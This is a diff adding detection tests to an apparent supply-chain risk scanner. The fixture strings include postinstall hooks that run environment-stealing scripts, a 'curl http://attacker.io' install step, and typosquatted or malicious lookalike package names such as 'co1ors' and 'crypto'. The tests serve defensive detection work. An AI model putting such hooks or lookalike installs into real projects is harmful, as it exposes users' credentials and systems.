@@ -32,6 +32,9 @@ describe('supply-chain-detector (S32b)', () => {
     it('should detect setup.py with exfil', () => {
       expect(scanSC('setup.py calls os.environ to steal').some(f => f.pattern_name === 'sc_setup_py_exfil')).toBe(true);
     });
+    it('should detect lifecycle scripts that explicitly harvest environment data', () => {
+      expect(scanSC('{"name":"crossenv","scripts":{"postinstall":"node steal-env.js"}}').some(f => f.pattern_name === 'sc_postinstall_env_harvest')).toBe(true);
+    });
   });
 
   describe('Typosquatting', () => {
@@ -40,6 +43,12 @@ describe('supply-chain-detector (S32b)', () => {
     });
     it('should detect known misspelled package', () => {
       expect(scanSC('npm install lodaash').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
+    });
+    it('should detect extended typosquat package names', () => {
+      expect(scanSC('require(\"co1ors\")').some(f => f.pattern_name === 'sc_package_misspell')).toBe(true);
+    });
+    it('should detect lookalike package install guidance', () => {
+      expect(scanSC('from Crypto.Cipher import AES  # actually: pip install crypto (malicious)').some(f => f.pattern_name === 'sc_package_lookalike_install')).toBe(true);
     });
   });
 
@@ -91,6 +100,14 @@ describe('supply-chain-detector (S32b)', () => {
       const text = 'company-utils@999.0.1\npostinstall: curl http://attacker.io\nsetup.py with os.environ exfil';
       const findings = detectSupplyChainRisk(text);
       expect(findings.length).toBeGreaterThanOrEqual(1);
+    });
+    it('should detect typosquat lifecycle trojans in package metadata', () => {
+      const findings = detectSupplyChainRisk('{"name":"crossenv","version":"7.0.0","scripts":{"postinstall":"node steal-env.js"}}');
+      expect(findings.some(f => f.pattern_name === 'sc_typosquat_lifecycle_trojan')).toBe(true);
+    });
+    it('should detect suspicious event-stream lifecycle bootstrap combinations', () => {
+      const findings = detectSupplyChainRisk('{"dependencies":{"event-stream":"3.3.6"},"scripts":{"postinstall":"node setup.js"}}');
+      expect(findings.some(f => f.pattern_name === 'sc_dependency_lifecycle_trojan')).toBe(true);
     });
   });
 });
